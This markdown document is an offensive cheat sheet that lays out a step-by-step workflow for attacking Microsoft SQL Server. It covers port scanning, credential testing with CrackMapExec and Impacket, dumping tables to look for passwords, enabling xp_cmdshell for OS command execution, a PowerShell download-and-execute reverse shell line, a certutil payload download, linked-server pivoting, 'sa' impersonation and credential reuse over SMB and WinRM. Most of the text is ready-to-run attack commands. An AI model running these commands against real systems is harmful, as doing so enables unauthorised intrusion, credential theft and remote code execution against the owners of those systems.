# MSSQL Enumeration & Exploitation

## Purpose

This file provides a structured workflow for enumerating MSSQL services and achieving command execution.

Core rules:

* MSSQL often uses domain credentials
* xp_cmdshell = OS command execution
* Always test credentials across services
* Treat MSSQL as a pivot point into the system

---

## 0. Identify MSSQL

Common port:

* 1433

Confirm:

```bash id="a3k7v1"
nmap -p 1433 -sV <IP>
```

---

## 1. Initial Access

### CrackMapExec

```bash id="z9d2c4"
crackmapexec mssql <IP>
```

With creds:

```bash id="q1f8n6"
crackmapexec mssql <IP> -u user -p pass -d DOMAIN
```

---

### Impacket Client

```bash id="r5j3t9"
mssqlclient.py DOMAIN/user:pass@<IP>
```

Local auth:

```bash id="y6p2v8"
mssqlclient.py user:pass@<IP>
```

---

## 2. Basic Enumeration

Inside MSSQL:

```sql id="n8k4w1"
SELECT name FROM master..sysdatabases;
```

```sql id="u7d3z5"
SELECT * FROM sys.databases;
```

---

## 3. Enumerate Tables

```sql id="p2x6m9"
USE <database>;
SELECT * FROM information_schema.tables;
```

---

## 4. Dump Data

```sql id="c5q9r2"
SELECT * FROM <table>;
```

Look for:

* credentials
* usernames
* passwords
* config data

---

## 5. Check Privileges

```sql id="h8v4k1"
SELECT SYSTEM_USER;
```

```sql id="b3m7t2"
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If sysadmin:
→ full control

---

## 6. Enable xp_cmdshell (CRITICAL)

```sql id="d1z6p3"
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## 7. Execute Commands

```sql id="k4n9x8"
EXEC xp_cmdshell 'whoami';
```

```sql id="s7v2c5"
EXEC xp_cmdshell 'dir';
```

---

## 8. Reverse Shell

Example:

```sql id="w2y8j6"
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<IP>/shell.ps1'')"';
```

Or use:

* nc
* PowerShell payloads

---

## 9. File Transfer

Download:

```sql id="x3f6r9"
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<IP>/file.exe file.exe';
```

---

## 10. Credential Discovery

Look in:

* database tables
* config tables
* stored procedures

---

## 11. Linked Servers (HIGH VALUE)

```sql id="g9k2p5"
EXEC sp_linkedservers;
```

Pivot:

```sql id="t4m7n1"
EXEC ('xp_cmdshell ''whoami''') AT [linked_server];
```

---

## 12. Impersonation

```sql id="v8c3z6"
SELECT * FROM sys.server_permissions;
```

```sql id="e1p5r7"
EXECUTE AS LOGIN = 'sa';
```

---

## 13. Credential Reuse

Test creds on:

```bash id="q7x2l4"
crackmapexec smb <IP> -u user -p pass
crackmapexec winrm <IP> -u user -p pass
```

---

## 14. Pivot Opportunities

MSSQL can give:

* OS command execution
* credentials
* lateral movement
* AD access

---

## 15. If xp_cmdshell Disabled

Try:

* enable it (if privileges allow)
* use alternative execution methods
* escalate privileges inside SQL

---

## 16. If Stuck

RESET:

* enumerate databases again
* check permissions
* test creds elsewhere
* look for linked servers

---

## 17. Mental Model

* MSSQL = gateway to OS
* Databases = credentials
* xp_cmdshell = execution

---

## 18. Golden Rules

* Always test credentials
* Always check sysadmin role
* Always try xp_cmdshell
* Always pivot to OS
